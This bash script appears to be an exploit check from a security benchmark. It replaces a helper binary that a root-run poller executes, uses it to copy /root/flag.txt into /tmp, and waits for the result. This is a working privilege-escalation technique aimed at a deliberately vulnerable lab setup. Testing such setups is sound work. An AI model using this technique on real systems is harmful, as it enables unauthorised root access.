#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/suidexec_flag
cat > /opt/bench/helper <<'\''EOF'\''
#!/bin/sh
cat /root/flag.txt > /tmp/suidexec_flag
EOF
chmod 777 /opt/bench/helper
for i in $(seq 1 45); do
  if test -r /tmp/suidexec_flag && grep -q FLAG /tmp/suidexec_flag 2>/dev/null; then
    cat /tmp/suidexec_flag
    exit 0
  fi
  sleep 1
done
echo "timeout waiting for suid_exec poller" >&2
ls -la /opt/bench/suid_exec /opt/bench/helper /tmp/suidexec_flag 2>&1 || true
exit 1
')"
assert_root_output "${out}"
